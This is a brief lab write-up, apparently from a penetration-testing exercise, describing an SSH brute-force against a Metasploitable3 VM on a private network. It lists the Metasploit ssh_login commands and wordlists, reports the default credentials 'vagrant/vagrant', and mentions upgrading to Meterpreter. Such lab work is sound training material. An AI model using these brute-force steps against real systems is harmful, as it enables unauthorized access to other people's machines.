# Phase 1: Attack Execution

## Network Info

- **Metasploitable3 IP:** `192.168.56.101`
- **Attacker (Kali) IP:** `192.168.56.102`

## ✅ Task 1.1: Compromise Using Metasploit

We targeted SSH (port 22) using brute force:

```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
show options
set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
set user_file /usr/share/wordlists/metasploit/unix_users.txt
set rhosts 192.168.56.101
exploit

Result: Found valid SSH credentials:

Username: vagrant

Password: vagrant

We then upgraded to Meterpreter for better control.